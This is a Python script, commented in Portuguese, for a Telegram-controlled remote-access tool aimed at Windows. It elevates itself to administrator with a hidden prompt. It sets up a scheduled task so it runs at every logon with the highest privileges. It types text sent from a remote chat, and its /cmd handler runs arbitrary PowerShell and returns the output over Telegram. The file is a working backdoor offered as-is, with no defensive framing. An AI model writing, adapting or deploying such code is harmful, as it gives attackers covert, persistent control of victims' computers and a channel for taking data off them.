import telebot
import subprocess
import pyautogui
import time
import ctypes
import sys
import os

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    exe = os.path.abspath(sys.executable)
    ctypes.windll.shell32.ShellExecuteW(None, "runas", exe, "", None, 0)
    sys.exit()

def adicionar_inicializacao():
    exe = os.path.abspath(sys.executable)
    # Verifica se a tarefa já existe para não duplicar
    verificar = subprocess.run('schtasks /query /tn "MeuBot"', shell=True, capture_output=True)
    if verificar.returncode != 0:
        subprocess.run(f'schtasks /create /tn "MeuBot" /tr "{exe}" /sc onlogon /rl highest /f', shell=True, capture_output=True)

adicionar_inicializacao()

BOT_TOKEN = "SEU_TOKEN_AQUI"

bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['clear'])
def apagar_texto(message):
    pyautogui.hotkey("ctrl", "a")
    time.sleep(0.1)
    pyautogui.press("delete")
    bot.reply_to(message, "🧹 Texto apagado.")

@bot.message_handler(commands=['notepad'])
def abrir_notepad(message):
    subprocess.Popen(["notepad.exe"])
    time.sleep(1)
    bot.reply_to(message, "📝 Notepad aberto. Use /type para digitar.")

@bot.message_handler(func=lambda msg: not msg.text.startswith("/"))
def digitar(message):
    texto = message.text.strip()

    if not texto:
        bot.reply_to(message, "Digite algum texto para ser escrito.")
        return

    pyautogui.write(texto, interval=0.03)
    bot.reply_to(message, "⌨️ Texto digitado com sucesso.")
    pyautogui.press("enter")

@bot.message_handler(commands=['cmd'])
def executar_comando(message):
    comando = message.text.replace("/cmd", "", 1).strip()

    if not comando:
        bot.reply_to(message, "Use: /cmd comando")
        return

    try:
        processo = subprocess.run(
            ["powershell", "-Command", comando],
            capture_output=True,
            text=True,
            timeout=30
        )

        saida = processo.stdout + processo.stderr

        if not saida.strip():
            saida = "Comando executado, sem saída."

        if len(saida) > 4000:
            saida = saida[:4000]

        bot.reply_to(message, f"💻 {saida}")

    except Exception as e:
        bot.reply_to(message, f"Erro: {str(e)}")

bot.infinity_polling()
